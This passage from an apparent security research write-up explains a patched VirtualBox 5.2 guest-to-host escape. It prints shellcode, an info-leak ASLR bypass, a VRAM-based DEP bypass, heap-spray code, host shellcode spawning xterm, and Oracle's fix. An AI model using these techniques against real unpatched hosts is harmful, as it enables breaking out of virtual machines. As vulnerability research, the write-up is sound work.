	; what of them will be used in RestoreBytes()
	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r14
	push r15
	; IDirect3DSurface9* pSrcSurfIf = [rsp + 0260h]
	; We add 8 to because the shellcode is call'ed by the patch
	; We also add 112 to account all the push'es (8 * 14)
	mov rax, qword ptr [rsp + 0260h + 08h + 070h];
	; wined3d_surface* surface = ((d3d9_surface*)pSrcSurfIf)->wined3d_surface
	mov rax, qword ptr [rax + 010h]
	; uint32_t hostId = surface->texture_name
	mov eax, dword ptr [rax + 0F4h]
	; Save Host ID
	mov dword ptr [gHostId], eax
	; Replace the patch with original bytes so the shellcode will not be called anymore
	call RestoreBytes
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax
	ret
Shellcode ENDP
END
```
The shellcode takes pSrcSurfIf, the value returned by VBoxD3DIfSurfGet, and goes through several structures to get Host ID. After that the shellcode restores an original bytes at the place of the jumper. This process of patching, hijacking, and restoring is repeated for 4 times. It’s because there are several Host ID and we must not accidentally take the lowest. For more details, see the HostIdHijacker.c file (not included in this blog post, for details on how to obtain it see the bottom of this post).
After Host ID is gathered it’s returned to the launcher process via WriteProcessMemory.
> Stage 3: Exploitation
- **Preparations**<br>
   dwm.exe process is suspended using PsSuspend tool by Sysinternals.
The launcher sends IOCTL_EXPLOIT command to the driver. The driver initializes HGSMI interface to communicate with the host.
- **ASLR Bypass**
  To bypass ASLR we need an additional vulnerability, ideally an information leak. There is such vulnerability in a handler of CR_GETCHROMIUMPARAMETERVCR_EXTEND_OPCODE Chromium command. The handler allocates a buffer on the stack and then reads it with length specified in the command, without a boundaries check. This way we able to obtain addresses inside VBoxSharedCrOpenGL.so and VBoxDD.so.
  ```c++
  (/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/server_misc.c)
void SERVER_DISPATCH_APIENTRY crServerDispatchGetChromiumParametervCR(GLenum target, GLuint index, GLenum type, GLsizei count, GLvoid *values)
{
    GLubyte local_storage[4096];
    GLint bytes = 0;
    switch (type) {
    case GL_BYTE:
    case GL_UNSIGNED_BYTE:
         bytes = count * sizeof(GLbyte);
         break;
    case GL_SHORT:
    case GL_UNSIGNED_SHORT:
         bytes = count * sizeof(GLshort);
         break;
    case GL_INT:
    case GL_UNSIGNED_INT:
         bytes = count * sizeof(GLint);
         break;
    case GL_FLOAT:
         bytes = count * sizeof(GLfloat);
         break;
    case GL_DOUBLE:
         bytes = count * sizeof(GLdouble);
         break;
    default:
         crError("Bad type in crServerDispatchGetChromiumParametervCR");
    }
...
    crServerReturnValue( local_storage, bytes );
}
```
**DEP Bypass**<br>
Not so difficult protection for this day. It might be enough to make a ROP chain but we have a quite scarce control of registers at the time of the vulnerable call [rax+320h], so I decided to search for another ways. It turned out that a host VirtualBox process has a memory region corresponding to guest video memory (VRAM) and its protection is RWX. If there is a pointer to VRAM in the host process, we could leak it using the information leak bug described above and transfer the control to VRAM where a shellcode written by our guest driver will be residing.
Indeed, there is a global variable in /src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c that stores an address of VRAM:

```c
uint8_t* g_pvVRamBase = NULL;
```
- Moreover, server_main.c is a part of VBoxSharedCrOpenGL.so library which address can be easily leaked, and the variable itself is placed at the fixed offset from the libary.
Thus to bypass DEP we leak VBoxSharedCrOpenGL.so address, add a fixed offset to it to obtain a pointer to g_pvVRamBase variable, and then force the host process to place the pointer in such way that later our ROP code will read a VRAM address from the pointer and will transfer the control to video memory. As we’ll see soon, just one ROP gadget is enough for that.

**Heap Spray**<br>
The last step is to spray the heap. We need to create many H3DORInstance-s following by a chunks with content controlled by us. To create a display I send VBOXCMDVBVA_FLIP command, as it does the WDDM driver. To allocate chunks of arbitrary content I send CR_PROGRAMNAMEDPARAMETER4DVNV_EXTEND_OPCODE command. This command accepting a buffer as an argument allocates memory and copies the buffer content to it, but doesn’t deallocates it even if the command is failed. I use this “feature” to pass the buffer of the following content:

```assembly
Offset 0x00: <address-of-rop-gadget>
Offset 0x08: <address-of-g_pvVRamBase>
Offset 0x10: <address-of-rop-gadget>
Offset 0x18: <address-of-g_pvVRamBase>
... and so on.
```
As you can see, our buffers contain only two values. The first, a pointer to the rop gadget, is placed at addresses modulo 16, so one of them will be used in the vulnerable call command. Remember:
```assembly
.text:0000000000100DFF                 mov     rax, [rax]
.text:0000000000100E02                 mov     rdi, [rdi+8]
.text:0000000000100E06                 call    qword ptr [rax+320h]
```
The second, a pointer to g_pvVRamBase, is placed at addresses not modulo 16, and one of them will be used in the ROP gadget:
```assembly
gef➤  x/3i $pc
=> 0x7f8485c3c403:	mov    rax,QWORD PTR [rax+0x48]
   0x7f8485c3c407:	mov    rdi,rax
   0x7f8485c3c40a:	call   QWORD PTR [rax]
```
Summarizing, the heap layout at the time of the vulnerable call will be like that:

```assembly
gef➤  x/128gx $rax
0x7f83cfd4f2e0:	0x00007f8485c3c403	0x0000000000000035
0x7f83cfd4f2f0:	0x00007f83cf0c2000	0x00007f83cfd50d70
0x7f83cfd4f300:	0x0000000000000000	0x0000029b00000556
0x7f83cfd4f310:	0x0000000000010101	0x0000000000000305
0x7f83cfd4f320:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f330:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f340:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f350:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f360:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f370:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f380:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f390:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f3a0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f3b0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f3c0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f3d0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f3e0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f3f0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f400:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f410:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f420:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f430:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f440:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f450:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f460:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f470:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f480:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f490:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f4a0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f4b0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f4c0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f4d0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f4e0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f4f0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f500:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f510:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f520:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f530:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f540:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f550:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f560:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f570:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f580:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f590:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f5a0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f5b0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f5c0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f5d0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f5e0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f5f0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f600:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f610:	0x00007f8485c3c403	0x0000000000000025
0x7f83cfd4f620:	0x00007f83cfd4f940	0x00007f83cfd4e020
0x7f83cfd4f630:	0x0000000007ffa000	0x0000000000000305
0x7f83cfd4f640:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f650:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f660:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f670:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f680:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f690:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f6a0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f6b0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f6c0:	0x00007f8485c3c403	0x00007f849fff1650
0x7f83cfd4f6d0:	0x00007f8485c3c403	0x00007f849fff1650
```
Here is the main part of the heap sprayer. It creates 64 displays and sprays 16384 chunks of size 0x2F8 holding the buffer shown above for each display.

```c++
for (uint32_t i = 0; i < 64; i++) {
	uint32_t currentBufferSize = 0x2F8;
	// We reinitialize the content of the buffer on each iteration not 		because it becomes dirty
	// but because without it the spraying is too fast and many of 			submitted buffers
	// are just ignored.
	for (uint32_t j = 0; j < 1024 * 16; j++) {
		*(pData + 3) = CR_EXTEND_OPCODE;
		*(uint32_t*)(pData + 4) = 0; // unused
		*(uint32_t*)(pData + 8)
			= CR_PROGRAMNAMEDPARAMETER4DVNV_EXTEND_OPCODE;
		*(uint32_t*)(pData + 12) = 0xFFFFFFFF; // id
		*(uint32_t*)(pData + 16) = currentBufferSize; // len
		*(uint64_t*)(pData + 20) = 0; // params[0]
		*(uint64_t*)(pData + 28) = 0; // params[1]
		*(uint64_t*)(pData + 36) = 0; // params[2]
		*(uint64_t*)(pData + 44) = 0; // params[3]
		const uint32_t bufferOffset = 52;
		bool spraySelector = 1;
		for (uint32_t off = bufferOffset; off < bufferOffset + 				currentBufferSize; off += sizeof(uint64_t)) {
			if (spraySelector) {
				*(uint64_t*)(pData + off) = rop_1;
			} else {
				*(uint64_t*)(pData + off) = vram_ptr;
			}
			spraySelector = !spraySelector;
		}
		int rc = VBoxHGSMIBufferSubmit(guestCtx, pShgsmiHdr);
		if (!RT_SUCCESS(rc)) {
			return STATUS_UNSUCCESSFUL;
		}
	}
	/* Create H3DORInstance (display) */
	MySendCrCmdFlip(pDevExt, pContext, hostId, i);
	RTThreadSleep(500);
}
```
**Shellcode and Process Continuation**<br>
When the call to the rop gadget is performed we are jumping into the shellcode residing in mapped VRAM:

```assembly
gef➤  x/19i $pc
=> 0x7f8478000000:	mov    rax,0x3a
   0x7f8478000007:	syscall
   0x7f8478000009:	test   rax,rax
   0x7f847800000c:	jne    0x7f8478000048
   0x7f847800000e:	lea    rsi,[rip+0x4e]        # 0x7f8478000063
   0x7f8478000015:	mov    QWORD PTR [rip+0x6b],rsi        # 0x7f8478000087
   0x7f847800001c:	lea    rsi,[rip+0x57]        # 0x7f847800007a
   0x7f8478000023:	mov    QWORD PTR [rip+0x6d],rsi        # 0x7f8478000097
   0x7f847800002a:	lea    rdi,[rip+0x32]        # 0x7f8478000063
   0x7f8478000031:	lea    rsi,[rip+0x4f]        # 0x7f8478000087
   0x7f8478000038:	lea    rdx,[rip+0x58]        # 0x7f8478000097
   0x7f847800003f:	mov    rax,0x3b
   0x7f8478000046:	syscall
   0x7f8478000048:	mov    rdi,QWORD PTR [rsp+0x1c8]
   0x7f8478000050:	add    rbp,0x2b0
   0x7f8478000057:	add    rsp,0x1d0
   0x7f847800005e:	xor    rax,rax
   0x7f8478000061:	push   rdi
   0x7f8478000062:	ret
```
The shellcode does fork+execve to spawn xterm in the child process. To continue execution of the virtual machine, we must configure RBP and RSP in such way that the RET instruction will return us back to svcHostCallPerform function where the RDP connection closure was initiated. In order to do so, one adds 0x2B0 to RBP and 0x1D0 to RSP.

**Patch**<br>
Oracle has fixed the vulnerability by moving the function call causing the double free out of the loop:
```c++
--- VirtualBox-5.2.16/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_base.cpp
+++ VirtualBox-5.2.18/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_base.cpp
@@ -326,10 +326,10 @@
             WARN(("err"));
             break;
         }
-
-        CrFbVisitCreatedEntries(mpFb, entriesDestroyCb, this);
     }
+    CrFbVisitCreatedEntries(mpFb, entriesDestroyCb, this);
+
     return rc;
 }
```
